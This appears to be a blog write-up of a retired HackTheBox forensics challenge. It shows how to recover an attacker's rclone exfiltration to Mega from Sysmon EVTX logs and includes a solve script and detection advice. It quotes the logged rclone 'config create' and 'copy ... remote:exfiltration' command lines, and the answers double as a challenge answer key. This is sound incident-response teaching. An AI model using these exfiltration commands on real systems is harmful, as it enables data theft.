---
layout: post
title: "HTB Challenge: Packet Cyclone"
date: 2027-08-22 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, sysmon, evtx, rclone, exfiltration, windows, utf-16, cwe-200]
---

A Windows forensics Q&A challenge: detect rclone cloud exfiltration buried in Sysmon EVTX logs — and discover why the standard Python EVTX parser isn't enough.

## Overview

*Packet Cyclone* is an HTB Forensics challenge (Easy, retired) built around a realistic incident response scenario. Wade's host was compromised and a tool called **rclone** was used to exfiltrate sensitive files to a Mega cloud remote. You receive a collection of 130+ Windows Event Log (`.evtx`) files, two Sigma detection rules for rclone activity, and a live Q&A server that accepts your forensic findings and returns the flag.

The critical technique: Windows EVTX files store all string data as **UTF-16 little-endian**, and the standard `python-evtx` library silently drops entire EVTX chunks it cannot parse — returning a partial record set with no error. The `strings -e l` fallback recovers all values from the raw binary.

## The technique

### EVTX encoding and the python-evtx silent-drop bug

Windows EVTX files are structured as a sequence of independent 64 KB chunks. Each chunk stores records in a compressed binary XML format called BXml. The `python-evtx` library parses this BXml and returns records as Python objects — but when it encounters a chunk that it cannot decode (malformed header, unsupported opcode, checksum mismatch), it **silently skips that chunk** and continues. No exception is raised; `log.records()` just returns fewer records than are physically in the file.

In this challenge, the Sysmon Operational log has two chunks. `python-evtx` parsed chunk 1 (57 events, no rclone activity). Chunk 2 — which contains the attacker's rclone commands — was silently dropped. Iterating `log.records()` returned zero rclone events.

The fix is to bypass the XML layer entirely. Windows EVTX records store all string-typed event fields — `CommandLine`, `Image`, `TargetFilename`, `ParentImage`, etc. — as raw **UTF-16LE** bytes in the binary. GNU `strings` with `-e l` (16-bit little-endian) extracts every readable string from the raw binary without any chunk awareness:

```bash
strings -e l Microsoft-Windows-Sysmon%4Operational.evtx | grep -i "rclone\|mega\|pass\|user"
```

This surfaces the attacker's full command lines directly from the binary, regardless of which chunk they live in.

### Sigma rules provided

Two detection rules were included to guide the investigation:

- **`rclone_config_creation.yaml`** — Sysmon [EventID 11](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90011) (file create) targeting `C:\Users\*\.config\rclone\*`
- **`rclone_execution.yaml`** — Sysmon [EventID 1](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001) (process create) where `Image` ends with `\rclone.exe` and `ParentImage` ends with `\PowerShell.exe` or `\cmd.exe`, with a `CommandLine` containing `pass`, `user`, `copy`, `mega`, `config`, etc.

Both rules target the same [MITRE ATT&CK T1567.002](https://attack.mitre.org/techniques/T1567/002/) technique — Exfiltration Over Web Service: Exfiltration to Cloud Storage.

## Solution

### Step 1 — Find the relevant EVTX file

The archive contains 130+ `.evtx` files. Start by identifying the Sysmon Operational log:

```bash
ls -lh Logs/Microsoft-Windows-Sysmon%4Operational.evtx
# 1.1M Feb 24  2023
```

### Step 2 — Extract strings with the UTF-16LE fallback

Because `python-evtx` silently drops the chunk containing the rclone events, use `strings -e l` instead:

```bash
strings -e l Logs/Microsoft-Windows-Sysmon%4Operational.evtx \
  | grep -i "rclone\|mega\|pass\|user\|copy\|config"
```

This returns two critical command lines from Sysmon [EventID 1](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90001) process creation records:

```
"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe"
  config create remote mega
  user majmeret@protonmail.com
  pass <redacted>

"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe"
  copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
```

The process ID of the `config create` invocation (visible via `strings -e l` near the record header) is `3820`.

### Step 3 — Answer the Q&A server

The live server asks six questions about the attacker's rclone usage. All answers are derivable directly from the strings extracted above:

| # | Question | Source |
|---|---|---|
| 1 | Attacker email | `user` parameter in config create |
| 2 | Attacker password | `pass` parameter in config create |
| 3 | Cloud storage provider | `mega` (the remote type) |
| 4 | Process ID of the config tool | `3820` (Sysmon EventID 1 record) |
| 5 | Full path of the exfiltrated folder | CommandLine of the `copy` invocation |
| 6 | Destination folder name | `exfiltration` (the `remote:exfiltration` argument) |

### Step 4 — Automate with `solve.py`

The following script connects to the challenge server and submits all six answers in sequence:

```python
#!/usr/bin/env python3
"""
Packet Cyclone — Forensics Q&A solve.
Key technique: strings -e l Sysmon*.evtx | grep rclone
"""
import socket, time

TARGET = ("<host>", <port>)

ANSWERS = [
    "majmeret@protonmail.com",
    "<redacted>",
    "mega",
    "3820",
    "C:\\Users\\Wade\\Desktop\\Relic_location",
    "exfiltration",
]

def interact(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(10)
    buf, ans_idx = b"", 0
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            text = buf.decode("utf-8", errors="replace")
            print(text, end="", flush=True)
            buf = b""
            if (">" in text or "?" in text) and ans_idx < len(ANSWERS):
                ans = ANSWERS[ans_idx]; ans_idx += 1
                time.sleep(0.5)
                s.sendall((ans + "\n").encode())
        except socket.timeout:
            break
    s.close()

if __name__ == "__main__":
    interact(*TARGET)
```

Running this returns: `HTB{...}`

## Why it worked

The attacker ran `rclone.exe` from a temporary extraction path under `wade`'s user profile and configured a Mega cloud remote with plaintext credentials embedded directly in the command line. This represents [information exposure](https://cwe.mitre.org/data/definitions/200.html) through process telemetry ([CWE-200](https://cwe.mitre.org/data/definitions/200.html)) — the credentials and exfiltration target are permanently logged in Sysmon EventID 1 records, which capture the full `CommandLine` of every process creation.

The `python-evtx` silent-drop bug is a tooling pitfall: when forensic analysis returns unexpectedly few records, always cross-check with `strings -e l` before concluding the log contains no relevant activity.

## Fix / defense

**Detection:**
- Sysmon EventID 1: alert on processes where `Image` ends with `\rclone.exe` and `ParentImage` is `powershell.exe` or `cmd.exe`
- Sysmon EventID 11: alert on file creation under `C:\Users\*\.config\rclone\`
- Network: rclone uses HTTPS to cloud-provider endpoints; alert on large sustained outbound transfers to Mega/Dropbox/S3 IP ranges from workstations

**Hardening:**
- Block or monitor cloud-sync tools (`rclone`, `gdrive`, `s3cmd`) via application allowlisting (e.g. AppLocker, WDAC)
- Forward Sysmon logs off-host to a SIEM in real time — local log clearing cannot destroy evidence that has already shipped
- Restrict outbound HTTPS from workstations to an approved proxy; direct cloud-provider connections are anomalous for most enterprise environments
